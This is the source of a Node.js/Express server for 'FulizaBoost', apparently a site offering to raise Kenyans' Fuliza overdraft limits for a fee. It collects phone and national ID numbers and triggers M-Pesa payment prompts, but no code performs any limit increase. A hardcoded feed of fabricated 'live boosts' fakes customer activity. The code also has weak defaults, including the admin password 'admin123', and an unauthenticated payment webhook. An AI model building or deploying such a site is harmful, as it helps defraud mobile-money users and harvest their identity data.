const express  = require('express');
const session  = require('express-session');
const { v4: uuidv4 } = require('uuid');
const path     = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// ─────────────────────────────────────────────────────────────────────────────
//  RAILWAY ENVIRONMENT VARIABLES — only ONE variable needed for STK push:
//
//  LIPANA_SECRET_KEY  →  Your Secret Key from Lipana dashboard
//                         (Go to lipana.dev → Dashboard → API Keys → Secret Key)
//                         It starts with  sk_live_...
//
//  BASE_URL           →  https://your-app.railway.app  (no trailing slash)
//  ADMIN_USER         →  admin
//  ADMIN_PASS         →  your secure password
//  SESSION_SECRET     →  any long random string
// ─────────────────────────────────────────────────────────────────────────────
const LIPANA_SECRET_KEY = process.env.LIPANA_SECRET_KEY || '';
const BASE_URL          = (process.env.BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, '');
const ADMIN_USER        = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS        = process.env.ADMIN_PASS || 'admin123';

// ─────────────────────────────────────────────────────────────────────────────
//  Phone formatter  →  +2547XXXXXXXX  (E.164 with + prefix — Lipana format)
// ─────────────────────────────────────────────────────────────────────────────
function formatPhone(raw) {
  let p = String(raw).replace(/\D/g, '');
  if (p.startsWith('0'))                       p = '254' + p.slice(1);
  if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
  if (!p.startsWith('254'))                    p = '254' + p;
  return '+' + p;  // +254712345678
}

// ─────────────────────────────────────────────────────────────────────────────
//  In-memory store
// ─────────────────────────────────────────────────────────────────────────────
let transactions = [
  { id:'TXN1A2B3C', phone:'+254712345678', nationalId:'234567890', limit:25000, fee:670,  status:'success', lipanaRef:null, mpesaCode:'SB12HGX9JE', ts:new Date(Date.now()-3600000).toISOString() },
  { id:'TXN4D5E6F', phone:'+254723456789', nationalId:'345678901', limit:10000, fee:240,  status:'success', lipanaRef:null, mpesaCode:'SC34HGX7KL', ts:new Date(Date.now()-7200000).toISOString() },
  { id:'TXN7G8H9I', phone:'+254734567890', nationalId:'456789012', limit:50000, fee:1400, status:'pending', lipanaRef:null, mpesaCode:null,          ts:new Date(Date.now()-1800000).toISOString() },
  { id:'TXNJK0LMN', phone:'+254745678901', nationalId:'567890123', limit:35000, fee:910,  status:'success', lipanaRef:null, mpesaCode:'SD56HGX5MN', ts:new Date(Date.now()-900000).toISOString()  },
  { id:'TXNOP1QRS', phone:'+254756789012', nationalId:'678901234', limit:16000, fee:450,  status:'failed',  lipanaRef:null, mpesaCode:null,          ts:new Date(Date.now()-5400000).toISOString() },
];

const liveBoosts = [
  { phone:'0712***321', limit:25000, ts: Date.now()-120000  },
  { phone:'0723***088', limit:10000, ts: Date.now()-280000  },
  { phone:'0734***567', limit:40000, ts: Date.now()-450000  },
  { phone:'0745***204', limit:50000, ts: Date.now()-700000  },
  { phone:'0756***901', limit:30000, ts: Date.now()-900000  },
  { phone:'0768***443', limit:16000, ts: Date.now()-1200000 },
  { phone:'0710***778', limit:70000, ts: Date.now()-1500000 },
  { phone:'0722***115', limit:21000, ts: Date.now()-1900000 },
];

// ─────────────────────────────────────────────────────────────────────────────
//  Initialise Lipana SDK — done once at startup
//  Per Lipana docs: new Lipana({ apiKey, environment })
//  initiateStkPush({ phone, amount }) — phone in E.164 (+254...)
// ─────────────────────────────────────────────────────────────────────────────
let lipanaClient = null;

if (LIPANA_SECRET_KEY) {
  try {
    const { Lipana } = require('@lipana/sdk');
    lipanaClient = new Lipana({
      apiKey:      LIPANA_SECRET_KEY,
      environment: 'production',
    });
    console.log('✅  Lipana SDK initialised — production mode');
  } catch (e) {
    console.error('❌  Lipana SDK failed to load:', e.message);
    console.error('    Make sure @lipana/sdk installed: run  npm install  on Railway');
  }
} else {
  console.warn('⚠️   LIPANA_SECRET_KEY not set — running in DEMO MODE');
}

// ─────────────────────────────────────────────────────────────────────────────
//  Parsers BEFORE all routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─────────────────────────────────────────────────────────────────────────────
//  /api ROUTES — ALL registered BEFORE express.static
//  This prevents the static middleware intercepting API calls (fixes 404 on webhook)
// ─────────────────────────────────────────────────────────────────────────────

// Live boosts feed
app.get('/api/live-boosts', (req, res) => {
  const real = transactions
    .filter(t => t.status === 'success')
    .map(t => ({ phone: t.phone.slice(0,5)+'***'+t.phone.slice(-3), limit: t.limit, ts: new Date(t.ts).getTime() }));
  const all = [...real, ...liveBoosts].sort((a,b) => b.ts - a.ts).slice(0, 20);
  res.json({ success: true, data: all });
});

// ── STK Push ──────────────────────────────────────────────────────────────────
app.post('/api/stk-push', async (req, res) => {
  const { phone, nationalId, limitAmount, fee } = req.body;

  // Validate inputs
  if (!phone || !nationalId || !limitAmount || !fee)
    return res.status(400).json({ success: false, message: 'All fields are required.' });

  const cleanId = String(nationalId).replace(/\D/g, '');
  if (cleanId.length < 7 || cleanId.length > 9)
    return res.status(400).json({ success: false, message: 'National ID must be 7–9 digits.' });

  const formattedPhone = formatPhone(phone);
  if (formattedPhone.length !== 13)
    return res.status(400).json({ success: false, message: 'Enter a valid Safaricom number e.g. 0712345678.' });

  // Create pending transaction
  const txnId = 'TXN' + uuidv4().replace(/-/g,'').substring(0,8).toUpperCase();
  const txn = {
    id: txnId, phone: formattedPhone, nationalId: cleanId,
    limit: parseInt(limitAmount), fee: parseInt(fee),
    status: 'pending', lipanaRef: null, mpesaCode: null,
    ts: new Date().toISOString(),
  };
  transactions.unshift(txn);

  // Add to live boosts feed
  liveBoosts.unshift({
    phone: formattedPhone.slice(0,5)+'***'+formattedPhone.slice(-3),
    limit: parseInt(limitAmount), ts: Date.now(),
  });
  if (liveBoosts.length > 50) liveBoosts.pop();

  // ── Demo mode — no key set ──
  if (!lipanaClient) {
    console.warn(`[Demo] STK push would go to ${formattedPhone} for KES ${fee}`);
    return res.json({
      success: true, transactionId: txnId, demo: true,
      message: 'Demo mode — set LIPANA_SECRET_KEY in Railway Variables.',
    });
  }

  // ── Real STK push via Lipana SDK ──
  try {
    console.log(`[STK] Sending to ${formattedPhone} | KES ${fee} | ref ${txnId}`);

    // Lipana SDK docs: initiateStkPush({ phone: '+254...', amount: integer })
    // Returns: { transactionId, status, message, ... }
    const response = await lipanaClient.transactions.initiateStkPush({
      phone:  formattedPhone,   // +254712345678
      amount: parseInt(fee),    // integer KES e.g. 670
    });

    console.log('[Lipana STK Response]', JSON.stringify(response));

    // Store Lipana's transaction ID so we can match the webhook callback
    txn.lipanaRef = response?.transactionId || response?.id || response?.data?.id || null;

    console.log(`[STK] ✅ Dispatched | lipanaRef: ${txn.lipanaRef}`);
    return res.json({
      success: true,
      transactionId: txnId,
      message: 'STK push sent. Check your phone and enter your M-Pesa PIN.',
    });

  } catch (err) {
    txn.status = 'failed';

    // Extract the clearest error message possible
    const httpStatus = err?.response?.status || err?.statusCode;
    const errBody    = err?.response?.data || err?.data;
    const errMsg     = errBody?.message
                    || errBody?.error
                    || err?.message
                    || 'Unknown error from Lipana';

    console.error(`[STK Error] HTTP ${httpStatus || 'N/A'} | ${errMsg}`);
    if (errBody) console.error('[STK Error Body]', JSON.stringify(errBody));

    // Return a clear actionable message to the user
    if (httpStatus === 401 || httpStatus === 403) {
      return res.status(500).json({ success: false,
        message: 'Lipana authentication failed. Check your LIPANA_SECRET_KEY in Railway Variables.' });
    }
    if (httpStatus === 422 || httpStatus === 400) {
      return res.status(400).json({ success: false, message: `Invalid request: ${errMsg}` });
    }
    return res.status(500).json({ success: false, message: `STK push failed: ${errMsg}` });
  }
});

// ── Lipana Webhook Callback ────────────────────────────────────────────────────
//  Lipana calls this URL after the customer approves/rejects the STK prompt.
//  Set this in Lipana dashboard → Settings → Webhook URL:
//    https://your-app.railway.app/api/lipana-callback
//
//  Lipana webhook payload (from SDK docs):
//  {
//    "event":         "transaction.success" | "transaction.failed",
//    "transactionId": "txn_xxxxx",         ← Lipana's ref
//    "status":        "success" | "failed",
//    "amount":        670,
//    "phone":         "+254712345678",
//    "mpesaCode":     "SH98HGX9JE",
//    "reference":     "TXN...",            ← our txnId we sent
//    "message":       "Payment received."
//  }
app.post('/api/lipana-callback', (req, res) => {
  // Respond 200 immediately — Lipana retries on any non-200 response
  res.status(200).json({ success: true });

  try {
    const body = req.body;
    console.log('[Lipana Webhook] Received:', JSON.stringify(body));

    // Extract fields — handle both native Lipana format and Daraja passthrough
    let txn       = null;
    let isSuccess = false;
    let mpesaCode = null;

    if (body?.Body?.stkCallback) {
      // Daraja STK passthrough format
      const cb  = body.Body.stkCallback;
      isSuccess = cb.ResultCode === 0 || cb.ResultCode === '0';
      txn = transactions.find(t => t.lipanaRef === cb.CheckoutRequestID)
         || transactions.find(t => t.id === cb.AccountReference);
      if (isSuccess && cb.CallbackMetadata?.Item) {
        const find = n => (cb.CallbackMetadata.Item.find(i => i.Name === n) || {}).Value;
        mpesaCode = find('MpesaReceiptNumber') || null;
      }
    } else {
      // Native Lipana format
      const ref   = body.reference || body.accountReference || null;
      const lipId = body.transactionId || body.transaction_id || body?.data?.id || null;
      isSuccess   = body.status === 'success'
                 || body.status === 'completed'
                 || body.event  === 'transaction.success';
      mpesaCode   = body.mpesaCode || body.mpesa_code || body?.data?.mpesaCode || null;

      // Match by our txnId (reference we passed), then by Lipana's transactionId
      txn = (ref   ? transactions.find(t => t.id === ref) : null)
         || (lipId ? transactions.find(t => t.lipanaRef === lipId) : null);

      // Last resort: match pending txn by phone number
      if (!txn && body.phone) {
        const ph = String(body.phone).replace(/\D/g,'');
        txn = transactions.find(t =>
          t.status === 'pending' &&
          t.phone.replace(/\D/g,'') === ph
        );
      }
    }

    if (txn) {
      txn.status     = isSuccess ? 'success' : 'failed';
      txn.mpesaCode  = mpesaCode;
      txn.failReason = isSuccess ? null : (body.message || body.ResultDesc || 'Payment not completed');
      console.log(`[Webhook] TXN ${txn.id} → ${txn.status} | Receipt: ${mpesaCode || 'N/A'}`);
    } else {
      console.warn('[Webhook] No matching transaction found. Body:', JSON.stringify(body));
    }
  } catch (e) {
    console.error('[Webhook Error]', e.message);
  }
});

// Poll transaction status
app.get('/api/transaction/:id', (req, res) => {
  const txn = transactions.find(t => t.id === req.params.id);
  if (!txn) return res.status(404).json({ success: false, message: 'Not found' });
  res.json({ success: true,
    transaction: { id: txn.id, status: txn.status, limit: txn.limit, fee: txn.fee, mpesaCode: txn.mpesaCode } });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Session + Admin
// ─────────────────────────────────────────────────────────────────────────────
app.use(session({
  secret: process.env.SESSION_SECRET || 'fulizaboost-change-in-prod',
  resave: false, saveUninitialized: false,
  cookie: { maxAge: 8 * 60 * 60 * 1000 },
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) return next();
  return res.redirect('/admin/login');
}

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    req.session.isAdmin = true;
    return res.json({ success: true });
  }
  return res.status(401).json({ success: false, message: 'Invalid credentials' });
});
app.post('/admin/logout', (req, res) => { req.session.destroy(); res.json({ success: true }); });

app.get('/api/admin/stats', requireAdmin, (req, res) => {
  const ok = transactions.filter(t => t.status === 'success');
  res.json({ total: transactions.length, success: ok.length,
    pending: transactions.filter(t => t.status === 'pending').length,
    failed:  transactions.filter(t => t.status === 'failed').length,
    revenue: ok.reduce((a,t) => a+t.fee, 0) });
});
app.get('/api/admin/transactions', requireAdmin, (req, res) => {
  const { q, status, page=1, limit=100 } = req.query;
  let data = [...transactions];
  if (q)      data = data.filter(t => t.phone.includes(q)||t.nationalId.includes(q)||t.id.includes(q));
  if (status) data = data.filter(t => t.status === status);
  const s = (parseInt(page)-1)*parseInt(limit);
  res.json({ success: true, data: data.slice(s, s+parseInt(limit)), total: data.length });
});
app.patch('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  const txn = transactions.find(t => t.id === req.params.id);
  if (!txn) return res.status(404).json({ success: false });
  Object.assign(txn, req.body);
  res.json({ success: true, transaction: txn });
});
app.delete('/api/admin/transactions/:id', requireAdmin, (req, res) => {
  transactions = transactions.filter(t => t.id !== req.params.id);
  res.json({ success: true });
});
app.get('/api/admin/users', requireAdmin, (req, res) => {
  const users = {};
  transactions.forEach(t => {
    if (!users[t.phone]) users[t.phone] = { phone: t.phone, nationalId: t.nationalId, paid: 0, upgrades: 0, last: t.ts };
    if (t.status === 'success') { users[t.phone].paid += t.fee; users[t.phone].upgrades++; }
    if (t.ts > users[t.phone].last) users[t.phone].last = t.ts;
  });
  res.json({ success: true, data: Object.values(users) });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Static + Page routes — AFTER all /api routes
// ─────────────────────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', requireAdmin, (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/admin/login', (req, res) => {
  if (req.session && req.session.isAdmin) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.use((req, res, next) => {
  if (req.path === '/admin.html') return res.redirect('/admin');
  if (req.path === '/login.html') return res.redirect('/admin/login');
  next();
});
app.use((req, res) =>
  res.status(404).sendFile(path.join(__dirname, 'public', 'index.html')));

// ─────────────────────────────────────────────────────────────────────────────
//  Start
// ─────────────────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`✅  FulizaBoost running  → http://localhost:${PORT}`);
  console.log(`📡  Webhook URL          → ${BASE_URL}/api/lipana-callback`);
  console.log(`🔑  LIPANA_SECRET_KEY    → ${LIPANA_SECRET_KEY ? 'SET ✅' : 'NOT SET ⚠️  (demo mode)'}`);
});
